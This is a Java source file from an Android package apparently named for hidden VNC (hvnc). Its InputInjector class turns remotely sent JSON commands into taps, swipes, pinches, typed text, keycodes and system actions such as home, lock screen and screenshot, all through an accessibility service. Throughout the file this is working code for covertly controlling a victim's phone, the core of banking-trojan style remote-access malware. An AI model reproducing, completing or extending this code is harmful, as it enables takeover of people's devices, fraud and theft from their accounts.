package com.fason.app.features.hvnc;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.media.AudioManager;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import org.json.JSONObject;

public final class InputInjector {
    private static final String TAG = "InputInjector";
    private static final long MIN_STROKE_MS = 1;
    private static final long MAX_STROKE_MS = 60_000;

    private InputInjector() {}

    public static boolean isReady() {
        return FasonAccessibilityService.getInstance() != null;
    }

    public static boolean isEnabled() {
        try {
            Context ctx = FasonApp.getContext();
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            String serviceName = ctx.getPackageName() + "/com.fason.app.core.FasonAccessibilityService";
            for (String token : enabled.split(":")) {
                if (token.equals(serviceName)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static void openSettings() {
        try {
            Context ctx = FasonApp.getContext();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception ignored) {}
    }

    public static void handleInput(JSONObject data) {
        if (!isReady()) {
            Log.w(TAG, "Service not ready, input ignored");
            HVncManager.getInstance().onInputAck(false);
            return;
        }
        try {
            HVncManager mgr = HVncManager.getInstance();
            float scaleX = mgr.getInputScaleX();
            float scaleY = mgr.getInputScaleY();
            String inputType = data.optString("inputType", "");
            switch (inputType) {
                case "tap":
                    doTap(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY)
                    );
                    break;
                case "swipe":
                    doSwipe(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY),
                        (int)(data.optInt("dx", 0) * scaleX),
                        (int)(data.optInt("dy", 0) * scaleY),
                        data.optLong("duration", 300)
                    );
                    break;
                case "scroll":
                    // v4.0: scroll gesture (same as swipe but faster, cleaner semantics)
                    doSwipe(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY),
                        (int)(data.optInt("dx", 0) * scaleX),
                        (int)(data.optInt("dy", 0) * scaleY),
                        data.optLong("duration", 150)
                    );
                    break;
                case "longpress":
                    doLongPress(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY),
                        data.optLong("duration", 1000)
                    );
                    break;
                case "doubletap":
                    // v4.0: double tap — two quick taps at same point
                    doDoubleTap(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY)
                    );
                    break;
                case "pinch":
                    // v4.0: two-finger pinch in or out
                    doPinch(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY),
                        (int)(data.optInt("x2", 0) * scaleX),
                        (int)(data.optInt("y2", 0) * scaleY),
                        (int)(data.optInt("dx", 0) * scaleX),
                        (int)(data.optInt("dy", 0) * scaleY),
                        (int)(data.optInt("dx2", 0) * scaleX),
                        (int)(data.optInt("dy2", 0) * scaleY),
                        data.optLong("duration", 400)
                    );
                    break;
                case "text":
                    doText(data.optString("text", ""));
                    break;
                // v4.0: global system actions
                case "back":
                    doGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                    break;
                case "home":
                    doGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    break;
                case "recents":
                    doGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                    break;
                case "notifications":
                    doGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                    break;
                case "quicksettings":
                    doGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
                    break;
                case "power_dialog":
                    doGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
                    break;
                case "lock_screen":
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                        doGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    } else {
                        HVncManager.getInstance().onInputAck(false);
                    }
                    break;
                case "screenshot":
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                        doGlobalAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT);
                    } else {
                        HVncManager.getInstance().onInputAck(false);
                    }
                    break;
                // v4.0: volume via AudioManager
                case "volume_up":
                    doVolume(AudioManager.ADJUST_RAISE);
                    break;
                case "volume_down":
                    doVolume(AudioManager.ADJUST_LOWER);
                    break;
                case "volume_mute":
                    doVolume(AudioManager.ADJUST_MUTE);
                    break;
                // v4.0: status bar pull-down via swipe from top
                case "statusbar":
                    doStatusBarPull();
                    break;
                // v4.0: raw keycode injection
                case "keycode":
                    doKeycode(data.optInt("keycode", -1));
                    break;
                default:
                    Log.w(TAG, "Unknown input type: " + inputType);
                    HVncManager.getInstance().onInputAck(false);
            }
        } catch (Exception e) {
            Log.e(TAG, "Input failed", e);
            HVncManager.getInstance().onInputAck(false);
        }
    }

    private static void doTap(int x, int y) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, MIN_STROKE_MS);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        svc.dispatchGesture(gesture, null, null); // fire-and-forget: no ACK wait
    }

    private static void doSwipe(int x, int y, int dx, int dy, long duration) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        long dur = clampDuration(duration);
        Path path = new Path();
        path.moveTo(x, y);
        path.lineTo(x + dx, y + dy);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, dur);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        svc.dispatchGesture(gesture, null, null); // fire-and-forget: no ACK wait
    }

    private static void doLongPress(int x, int y, long duration) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        long dur = clampDuration(duration);
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, dur);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        svc.dispatchGesture(gesture, null, null); // fire-and-forget: no ACK wait
    }

    // v4.0: double tap — two quick strokes at the same point with 40ms gap
    private static void doDoubleTap(int x, int y) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription s1 = new GestureDescription.StrokeDescription(path, 0, MIN_STROKE_MS);
        Path path2 = new Path();
        path2.moveTo(x, y);
        // second tap starts 40ms after first ends
        GestureDescription.StrokeDescription s2 = new GestureDescription.StrokeDescription(path2, MIN_STROKE_MS + 30, MIN_STROKE_MS); // 31ms total
        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(s1)
            .addStroke(s2)
            .build();
        svc.dispatchGesture(gesture, null, null); // fire-and-forget: no ACK wait
    }

    // v4.0: two-finger pinch — two simultaneous strokes
    private static void doPinch(int x1, int y1, int x2, int y2,
                                  int dx1, int dy1, int dx2, int dy2, long duration) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        long dur = clampDuration(duration);
        Path p1 = new Path();
        p1.moveTo(x1, y1);
        p1.lineTo(x1 + dx1, y1 + dy1);
        Path p2 = new Path();
        p2.moveTo(x2, y2);
        p2.lineTo(x2 + dx2, y2 + dy2);
        GestureDescription.StrokeDescription s1 = new GestureDescription.StrokeDescription(p1, 0, dur);
        GestureDescription.StrokeDescription s2 = new GestureDescription.StrokeDescription(p2, 0, dur);
        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(s1)
            .addStroke(s2)
            .build();
        svc.dispatchGesture(gesture, null, null); // fire-and-forget: no ACK wait
    }

    // v4.0: global action helper
    private static void doGlobalAction(int action) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        boolean ok = svc.performGlobalAction(action);
        HVncManager.getInstance().onInputAck(ok);
    }

    // v4.0: volume adjustment
    private static void doVolume(int direction) {
        try {
            Context ctx = FasonApp.getContext();
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) { HVncManager.getInstance().onInputAck(false); return; }
            am.adjustStreamVolume(AudioManager.STREAM_MUSIC, direction, AudioManager.FLAG_SHOW_UI);
            HVncManager.getInstance().onInputAck(true);
        } catch (Exception e) {
            Log.e(TAG, "Volume adjust failed", e);
            HVncManager.getInstance().onInputAck(false);
        }
    }

    // v4.0: status bar pull-down — swipe from top centre of screen downward
    private static void doStatusBarPull() {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        // Try system notification global action first (API 33+)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            boolean ok = svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
            if (ok) { HVncManager.getInstance().onInputAck(true); return; }
        }
        // Fallback: swipe gesture from top
        try {
            android.view.WindowManager wm = (android.view.WindowManager)
                FasonApp.getContext().getSystemService(Context.WINDOW_SERVICE);
            int screenW = 0, screenH = 0;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                android.view.WindowMetrics m = wm.getCurrentWindowMetrics();
                screenW = m.getBounds().width();
                screenH = m.getBounds().height();
            } else {
                android.util.DisplayMetrics dm = new android.util.DisplayMetrics();
                wm.getDefaultDisplay().getRealMetrics(dm);
                screenW = dm.widthPixels;
                screenH = dm.heightPixels;
            }
            int cx = screenW / 2;
            Path path = new Path();
            path.moveTo(cx, 0);
            path.lineTo(cx, screenH / 2);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 300);
            GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
            svc.dispatchGesture(gesture, null, null); // fire-and-forget: no ACK wait
        } catch (Exception e) {
            Log.e(TAG, "Status bar pull failed", e);
            HVncManager.getInstance().onInputAck(false);
        }
    }

    // v4.0: raw keycode injection via AccessibilityService
    private static void doKeycode(int keycode) {
        if (keycode < 0) { HVncManager.getInstance().onInputAck(false); return; }
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        // Map common keycodes to global actions if possible
        switch (keycode) {
            case KeyEvent.KEYCODE_BACK:
                svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                HVncManager.getInstance().onInputAck(true);
                break;
            case KeyEvent.KEYCODE_HOME:
                svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                HVncManager.getInstance().onInputAck(true);
                break;
            case KeyEvent.KEYCODE_APP_SWITCH:
                svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                HVncManager.getInstance().onInputAck(true);
                break;
            default:
                // For other keycodes, try to find focused node and inject
                try {
                    AccessibilityNodeInfo root = svc.getRootInActiveWindow();
                    if (root != null) {
                        AccessibilityNodeInfo focused = findFocusedNode(root);
                        if (focused != null) {
                            Bundle args = new Bundle();
                            args.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT, keycode);
                            // This is a best-effort — not all keycodes map cleanly
                            root.recycle();
                        }
                    }
                } catch (Exception ignored) {}
                HVncManager.getInstance().onInputAck(false);
                break;
        }
    }

    private static void doText(String text) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        AccessibilityNodeInfo root = svc.getRootInActiveWindow();
        if (root == null) {
            Log.w(TAG, "No active window");
            HVncManager.getInstance().onInputAck(false);
            return;
        }
        AccessibilityNodeInfo target = findFocusedEditable(root);
        if (target == null) target = findEditableNode(root);
        if (target == null) {
            Log.w(TAG, "No editable node");
            root.recycle();
            HVncManager.getInstance().onInputAck(false);
            return;
        }
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        boolean ok = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        if (!ok) {
            try {
                android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    FasonApp.getContext().getSystemService(Context.CLIPBOARD_SERVICE);
                android.content.ClipData oldClip = cm.getPrimaryClip();
                android.content.ClipData clip = android.content.ClipData.newPlainText("text", text);
                cm.setPrimaryClip(clip);
                ok = target.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                if (oldClip != null) cm.setPrimaryClip(oldClip);
            } catch (Exception e) {
                Log.e(TAG, "Paste fallback failed", e);
            }
        }
        target.recycle();
        if (target != root) root.recycle();
        HVncManager.getInstance().onInputAck(ok);
    }

    private static AccessibilityNodeInfo findFocusedEditable(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isEditable() && root.isFocused()) return root;
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findFocusedEditable(child);
                if (found != null) { if (found != child) child.recycle(); return found; }
                child.recycle();
            }
        }
        return null;
    }

    private static AccessibilityNodeInfo findEditableNode(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isEditable()) return root;
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findEditableNode(child);
                if (found != null) { if (found != child) child.recycle(); return found; }
                child.recycle();
            }
        }
        return null;
    }

    private static AccessibilityNodeInfo findFocusedNode(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isFocused()) return root;
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findFocusedNode(child);
                if (found != null) { if (found != child) child.recycle(); return found; }
                child.recycle();
            }
        }
        return null;
    }

    private static long clampDuration(long duration) {
        if (duration < MIN_STROKE_MS) return MIN_STROKE_MS;
        if (duration > MAX_STROKE_MS) return MAX_STROKE_MS;
        return duration;
    }

    // Gesture callback removed — all dispatchGesture calls pass null (fire-and-forget)
}
